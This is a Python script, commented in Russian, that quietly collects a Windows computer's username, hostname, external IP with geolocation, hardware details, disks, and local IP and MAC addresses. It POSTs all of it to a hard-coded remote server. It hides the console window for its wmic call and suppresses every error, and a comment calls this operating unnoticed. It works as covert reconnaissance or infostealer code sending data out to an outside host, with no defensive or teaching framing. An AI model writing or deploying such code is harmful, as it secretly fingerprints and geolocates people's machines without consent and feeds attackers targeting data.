import os
import platform
import socket
import psutil
import datetime
import traceback
import subprocess
import requests

# --- КОНФИГУРАЦИЯ ---
# URL API на PythonAnywhere для приема данных.
SERVER_URL = "http://jkl2.pythonanywhere.com/collect"


def collect_system_info():
    """Собирает подробную информацию о системе."""

    def bytes_to_gb(bts):
        return round(bts / (1024**3), 2)

    try:
        info_lines = []
        # Сбор данных через ipinfo.io
        info_lines.append("--- ВНЕШНИЙ IP-АДРЕС ---")
        try:
            response = requests.get("https://ipinfo.io", timeout=5)
            if response.status_code == 200:
                ip_data = response.json()
                key_map = {
                    "ip": "IP-адрес",
                    "hostname": "Хостнейм",
                    "city": "Город",
                    "region": "Регион",
                    "country": "Страна",
                    "loc": "Координаты",
                    "org": "Провайдер",
                    "timezone": "Часовой пояс",
                }
                for key, label in key_map.items():
                    value = ip_data.get(key)
                    if value:
                        info_lines.append(f"{label}: {value}")
            else:
                info_lines.append(
                    f"Сервис ipinfo.io вернул ошибку: {response.status_code}"
                )
        except Exception as e:
            info_lines.append(f"Не удалось получить информацию: {e.__class__.__name__}")

        info_lines.extend(
            [
                "\n--- СИСТЕМНАЯ ИНФОРМАЦИЯ ---",
                f"Имя пользователя: {os.getlogin()}",
                f"Имя компьютера: {socket.gethostname()}",
                f"ОС: {platform.platform()}",
                f"Время сбора данных: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            ]
        )

        boot_time = datetime.datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.datetime.now() - boot_time
        info_lines.append(f"Время работы системы: {str(uptime).split('.')[0]}")

        info_lines.extend(
            [
                "\n--- ПРОЦЕССОР ---",
                f"Модель: {platform.processor()}",
                f"Физические ядра: {psutil.cpu_count(logical=False)}",
                f"Логические ядра (потоки): {psutil.cpu_count(logical=True)}",
            ]
        )

        mem = psutil.virtual_memory()
        info_lines.extend(
            [
                "\n--- ОПЕРАТИВНАЯ ПАМЯТЬ (ОЗУ) ---",
                f"Всего: {bytes_to_gb(mem.total)} ГБ",
                f"Использовано: {bytes_to_gb(mem.used)} ГБ ({mem.percent}%)",
                f"Свободно: {bytes_to_gb(mem.available)} ГБ",
            ]
        )

        try:
            gpus = subprocess.check_output(
                "wmic path win32_VideoController get name",
                text=True,
                stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW,
            )
            gpu_list = [
                line.strip()
                for line in gpus.splitlines()
                if line.strip() and line.strip() != "Name"
            ]
            if gpu_list:
                info_lines.append("\n--- ВИДЕОКАРТА (GPU) ---")
                info_lines.extend(gpu_list)
        except Exception:
            info_lines.append(
                "\n--- ВИДЕОКАРТА (GPU) ---\nНе удалось определить видеокарту."
            )

        info_lines.append("\n--- ДИСКОВЫЕ НАКОПИТЕЛИ ---")
        for p in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(p.mountpoint)
                info_lines.append(
                    f"Диск {p.device} ({p.fstype}) - Всего: {bytes_to_gb(usage.total)} ГБ, "
                    f"Занято: {bytes_to_gb(usage.used)} ГБ ({usage.percent}%)"
                )
            except (PermissionError, FileNotFoundError):
                continue

        info_lines.append("\n--- ЛОКАЛЬНЫЕ СЕТЕВЫЕ ИНТЕРФЕЙСЫ ---")
        for iface_name, iface_addresses in psutil.net_if_addrs().items():
            info_lines.append(f"Интерфейс: {iface_name}")
            for addr in iface_addresses:
                if addr.family == socket.AF_INET:
                    info_lines.append(f"  IPv4-адрес: {addr.address}")
                elif addr.family == psutil.AF_LINK:
                    info_lines.append(f"  MAC-адрес: {addr.address}")

        return "\n".join(info_lines)

    except Exception:
        return f"Произошла ошибка при сборе информации:\n{traceback.format_exc()}"


def main():
    try:
        sys_info_content = collect_system_info()
        # Идентификатор машины формируется из имени компьютера и пользователя.
        computer_name = socket.gethostname()
        user_name = os.getlogin()

        # Очистка имени от символов, недопустимых в именах папок Windows.
        folder_name = f"{computer_name}-{user_name}"
        invalid_chars = r'<>:"/\\\|\?\*'
        folder_name = "".join(c for c in folder_name if c not in invalid_chars)

        # Имя файла содержит временную метку для фиксации каждого запуска.
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        file_name = f"info_{timestamp}.txt"

        # Упаковываем данные в словарь (JSON) для отправки на сервер
        payload = {
            "folder_name": folder_name,
            "file_name": file_name,
            "content": sys_info_content,
        }

        # Отправляем данные на сервер методом POST
        # timeout=10 - чтобы скрипт не "зависал", если сервер не отвечает
        requests.post(SERVER_URL, json=payload, timeout=10)

    except Exception:
        # Основной блок для "незаметной" работы
        pass


if __name__ == "__main__":
    main()
